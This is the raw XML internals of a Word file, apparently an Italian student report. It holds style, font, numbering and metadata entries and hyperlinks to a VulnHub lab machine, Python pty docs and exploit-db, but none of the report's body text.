    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testomacro">
    <w:name w:val="macro"/>
    <w:link w:val="TestomacroCarattere"/>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stomacroCarattere">
    <w:name w:val="Testo macro Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testomacro"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testonormale">
    <w:name w:val="Plain Text"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="TestonormaleCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TestonormaleCarattere">
    <w:name w:val="Testo normale Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testonormale"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Testosegnaposto">
    <w:name w:val="Placeholder Text"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:color w:val="595959" w:themeColor="text1" w:themeTint="A6"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario4">
    <w:name w:val="toc 4"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario5">
    <w:name w:val="toc 5"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario6">
    <w:name w:val="toc 6"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario7">
    <w:name w:val="toc 7"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario8">
    <w:name w:val="toc 8"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario9">
    <w:name w:val="toc 9"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Collegamentoipertestuale">
    <w:name w:val="Hyperlink"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="004A3D0B"/>
    <w:rPr>
      <w:color w:val="993E21" w:themeColor="hyperlink"/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="fontstyle01">
    <w:name w:val="fontstyle01"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:rsid w:val="00B904C8"/>
    <w:rPr>
      <w:rFonts w:ascii="CMR10" w:hAnsi="CMR10" w:hint="default"/>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:i w:val="0"/>
      <w:iCs w:val="0"/>
      <w:color w:val="000000"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="fontstyle21">
    <w:name w:val="fontstyle21"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:rsid w:val="00B904C8"/>
    <w:rPr>
      <w:rFonts w:ascii="CMTI10" w:hAnsi="CMTI10" w:hint="default"/>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Paragrafoelenco">
    <w:name w:val="List Paragraph"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="34"/>
    <w:qFormat/>
    <w:rsid w:val="00AE4289"/>
    <w:pPr>
      <w:ind w:left="720"/>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:styleId="Menzionenonrisolta">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00B703CC"/>
    <w:rPr>
      <w:color w:val="605E5C"/>
      <w:shd w:val="clear" w:color="auto" w:fill="E1DFDD"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="fontstyle11">
    <w:name w:val="fontstyle11"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:rsid w:val="00ED40FB"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri-Italic" w:hAnsi="Calibri-Italic" w:hint="default"/>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="404040"/>
      <w:sz w:val="36"/>
      <w:szCs w:val="36"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="fontstyle31">
    <w:name w:val="fontstyle31"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:rsid w:val="00E32D5A"/>
    <w:rPr>
      <w:rFonts w:ascii="SFTI1000" w:hAnsi="SFTI1000" w:hint="default"/>
      <w:b w:val="0"/>
      <w:bCs w:val="0"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="000000"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Enfasigrassetto">
    <w:name w:val="Strong"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="22"/>
    <w:qFormat/>
    <w:rsid w:val="002A18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3605">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="80875540">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="301425074">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="343242061">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="355888392">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="481310635">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="642121911">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="867303701">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="939990964">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1256671860">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1058254">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1474713874">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1524978023">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1543178214">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1643578412">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780106526">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1837333274">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1873107170">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="1880630211">
      <w:bodyDiv w:val="1"/>
      <w:marLeft w:val="0"/>
      <w:marRight w:val="0"/>
      <w:marTop w:val="0"/>
      <w:marBottom w:val="0"/>
      <w:divBdr>
        <w:top w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:left w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:bottom w:val="none" w:sz="0" w:space="0" w:color="auto"/>
        <w:right w:val="none" w:sz="0" w:space="0" w:color="auto"/>
      </w:divBdr>
    </w:div>
    <w:div w:id="211374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vulnhub.com/entry/five86-1,417/"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ocs.python.org/2/library/pty.html" TargetMode="External"/><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10.0.2.4/" TargetMode="External"/><Relationship Id="rId35" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://10.0.2.4/ona/" TargetMode="External"/><Relationship Id="rId43" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image32.png"/><Relationship Id="rId48" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.ictea.com/cs/knowledgebase.php?action=displayarticle&amp;id=1720&amp;language=Italian"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www.exploit-db.com/"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www.ictea.com/cs/knowledgebase.php?action=displayarticle&amp;id=1709&amp;language=Italian"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tesio\AppData\Roaming\Microsoft\Templates\Relazione%20studente%20con%20copertina.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573BCD9F82842B59CB64A476EFD06A0"/>
        <w:category>
          <w:name w:val="Generale"/>
          <w:gallery w:val="placeholder"/>
        </w:category>
        <w:types>
          <w:type w:val="bbPlcHdr"/>
        </w:types>
        <w:behaviors>
          <w:behavior w:val="content"/>
        </w:behaviors>
        <w:guid w:val="{B6A3F983-58EE-45E4-9B4C-B6D91D0EC289}"/>
      </w:docPartPr>
      <w:docPartBody>
        <w:p w:rsidR="00471B9B" w:rsidRDefault="00CD418A" w:rsidP="00CD418A">
          <w:pPr>
            <w:pStyle w:val="4573BCD9F82842B59CB64A476EFD06A0"/>
          </w:pPr>
          <w:r>
            <w:rPr>
              <w:lang w:bidi="it-IT"/>
            </w:rPr>
            <w:t>Corso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MR10">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="CMTI10">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="Calibri-Italic">
    <w:altName w:val="Calibri"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="SFTI1000">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="SFBX1000">
    <w:altName w:val="Cambria"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="CourierNewPS-BoldMT">
    <w:altName w:val="Courier New"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="Calibri-Bold">
    <w:altName w:val="Calibri"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="SFRM1000">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5781F0C"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="Puntoelenco"/>
      <w:lvlText w:val="−"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Century Gothic" w:hAnsi="Century Gothic" w:hint="default"/>
        <w:color w:val="0D0D0D" w:themeColor="text1" w:themeTint="F2"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:num w:numId="1" w16cid:durableId="160368269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85"/>
    <w:rsid w:val="0003499B"/>
    <w:rsid w:val="00034DBF"/>
    <w:rsid w:val="00081B2E"/>
    <w:rsid w:val="00122D0D"/>
    <w:rsid w:val="002B4223"/>
    <w:rsid w:val="00321055"/>
    <w:rsid w:val="00463487"/>
    <w:rsid w:val="00471B9B"/>
    <w:rsid w:val="00547CA6"/>
    <w:rsid w:val="005740B5"/>
    <w:rsid w:val="00580B49"/>
    <w:rsid w:val="00603C6F"/>
    <w:rsid w:val="006742B1"/>
    <w:rsid w:val="00684F21"/>
    <w:rsid w:val="00750466"/>
    <w:rsid w:val="00815227"/>
    <w:rsid w:val="00884FA6"/>
    <w:rsid w:val="008B42F9"/>
    <w:rsid w:val="009D25E0"/>
    <w:rsid w:val="009E40BF"/>
    <w:rsid w:val="00B17439"/>
    <w:rsid w:val="00B6375C"/>
    <w:rsid w:val="00B8669A"/>
    <w:rsid w:val="00B91A27"/>
    <w:rsid w:val="00BA548B"/>
    <w:rsid w:val="00BF0813"/>
    <w:rsid w:val="00C957BF"/>
    <w:rsid w:val="00CA56E4"/>
    <w:rsid w:val="00CD418A"/>
    <w:rsid w:val="00D01B54"/>
    <w:rsid w:val="00D15603"/>
    <w:rsid w:val="00D55F85"/>
    <w:rsid w:val="00D570DA"/>
    <w:rsid w:val="00EB429C"/>
    <w:rsid w:val="00F5029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untoelenco">
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="7"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:spacing w:before="120" w:after="200" w:line="264" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:color w:val="44546A" w:themeColor="text2"/>
      <w:lang w:eastAsia="ja-JP"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="4573BCD9F82842B59CB64A476EFD06A0">
    <w:name w:val="4573BCD9F82842B59CB64A476EFD06A0"/>
    <w:rsid w:val="00CD41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166EC-C93B-4AD9-AA1B-3864612B0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Relazione studente con copertina.dotx</Template>
  <TotalTime>4317</TotalTime>
  <Pages>1</Pages>
  <Words>5562</Words>
  <Characters>31708</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>264</Lines>
  <Paragraphs>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Raffaele Pizzolante</dc:creator>
  <cp:keywords/>
  <cp:lastModifiedBy>PAOLO LABANCA</cp:lastModifiedBy>
  <cp:revision>47</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2019-12-02T20:03:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-07-11T16:09:00Z</dcterms:modified>
  <cp:version/>
</cp:coreProperties>
</file>